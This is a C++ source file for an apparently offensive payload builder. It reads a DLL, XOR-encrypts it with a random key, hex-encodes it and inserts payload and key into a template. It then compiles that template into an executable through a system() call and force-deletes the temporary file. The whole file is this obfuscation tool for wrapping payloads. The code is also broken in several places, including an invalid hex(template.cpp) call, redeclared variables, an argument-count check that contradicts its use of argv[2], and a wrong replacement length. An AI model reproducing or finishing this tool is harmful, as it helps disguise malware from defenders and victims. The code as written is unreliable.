#include <iostream>
#include <vector>
#include <fstream>
#include <cstdint>
#include <iomanip>
#include <sstream>
#include <random>
#include <string>

// key generation code
std::vector<uint8_t> keygen() {
    std::random_device randomDev;
    std::mt19937_64 generate(randomDev());
    std::uniform_int_distribution<uint16_t> distribute(0, 255); 
    std::vector<uint8_t> key(32); 
    for (size_t i = 0; i < key.size(); ++i) {
        key[i] = static_cast<uint8_t>(distribute(generate)); 
    }
    return key;
}

// XOR cipher code
void XOR(std::vector<uint8_t>& pyld, const std::vector<uint8_t>& key) {
    size_t keyLength = key.size();
    size_t dataLength = pyld.size();
    for (size_t i = 0; i < dataLength; ++i) {
        pyld[i] ^= key[i % keyLength];
    }
}

// Vector --> Hex
std::string hex(const std::vector<uint8_t>& data) {
    std::ostringstream hexStringStream;
    hexStringStream << std::hex << std::setfill('0');
    for (const uint8_t& byte : data) {
        hexStringStream << std::setw(2) << static_cast<int>(byte);
    }
    return hexStringStream.str();
}

// hex String --> vector 
std::vector<uint8_t> dehex(const std::string& hexString) {
    std::vector<uint8_t> result;
    for (size_t i = 0; i < hexString.length(); i += 2) {
        uint8_t byte = std::stoi(hexString.substr(i, 2), nullptr, 16);
        result.push_back(byte);
    }
    return result;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <input_file.DLL>" << "output_file.exe" << std::endl;
        return 1;
    }

    std::cout << "[+] Attempting to read DLL " << std::endl;
    std::string DLL = argv[1];
    std::ifstream ifstreamReader(DLL, std::ios::binary);
    if (!ifstreamReader) {
        std::cerr << "ERROR: FATAL: UNABLE TO OPEN DLL" << std::endl;
        return 1;
    }
    std::vector<uint8_t> bytes;
    uint8_t buffer;
    while (ifstreamReader.read(reinterpret_cast<char*>(&buffer), 1)) {
        bytes.push_back(buffer);
    }
    ifstreamReader.close();
    std::cout << "[+] DLL read succesfully " << std::endl;
    // key gen
    std::cout << "[+] Generating Key" << std::endl;
    std::vector<uint8_t> key = keygen();
    std::cout << "[+] keygen succesful" << std::endl;

    std::cout << "[+] Ciphering payload..." << std::endl;
    XOR(bytes, key);
    std::cout << "[+] Payload Ciphered succesfully " << std::endl;
    std::string strPayload = hex(bytes);
    std::cout << "[!] Hex Payload: \n\n<<<<<<<<<<<<START<<<<<<<<<<<<\n\n" << strPayload << "\n\n<<<<<<<<<<<<END<<<<<<<<<<<<<<\n" << std::endl;
    std::string strKey = hex(key);


    /////////////////////////////////////////////////////////////////
    std::vector<uint8_t> decoded = dehex(strPayload);
    XOR(decoded, key);
    std::string strDecoded = hex(decoded);

    // modify template OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
   // std::cout << "[+] Creating payload source" << std::endl;
   // std::ifstream tmplt("template.cpp");
   // if (!tmplt) {
     //  std::cerr << "[!] ERROR: FATAL: template.cpp WAS DESTROYED OR MOVED" << std::endl;
     // return 1;
   // }
    std::string templateString = hex(template.cpp);
    // THIS IS WHERE THE TEMPLATE IS CONVERTED FROM IFSTREAM TO STD::STRING, CONVERT IT FROM HEX-->VECTOR-->STRING INSTEAD
    //std::string content((std::istreambuf_iterator<char>(tmplt)), std::istreambuf_iterator<char>());
   // tmplt.close(); // delete this as well
std::vector<unsigned char> bytes(content.begin(), content.end());
    std::string str(bytes.begin(), bytes.end());
    std::cout << str << std::endl;
    std::string templateStuffy = hex(template.cpp);
    std::vector<uint8_t> templateVector = dehex(templateStuffy);
    std::string content(templateVector.begin(), templateVector.end());

    size_t pos = 0;
    while ((pos = content.find("AAA", pos)) != std::string::npos) {
        content.replace(pos, 4, strPayload); 
        pos += strPayload.length();
    }
    pos = 0;
    while ((pos = content.find("BBB", pos)) != std::string::npos) {
        content.replace(pos, 4, strKey);
        pos += strKey.length();
    }
    std::cout << "[+] Payload built" << std::endl;

    std::string outfile = "tmp.cpp";
    std::ofstream tmpfile(outfile);
    if (!tmpfile) {
        std::cerr << "[!] ERROR: FATAL: UNABLE TO CREATE OUTFILE" << std::endl;
        return 1;
    }

    // Write the modified content to the new file
    tmpfile << content;
    tmpfile.close();

    std::cout << "[+] Compiling payload" << std::endl;
    std::string outfile = argv[2];
    std::string strCompilationCMD = std::string("g++ -o ") + outfile + std::string(" tmp.cpp");
    const char* cmd = strCompilationCMD.c_str();
    system(cmd);
    system("del /f /q tmp.cpp");
    std::cout << "[!] Payload built!" << std::endl;
    return 0;
}
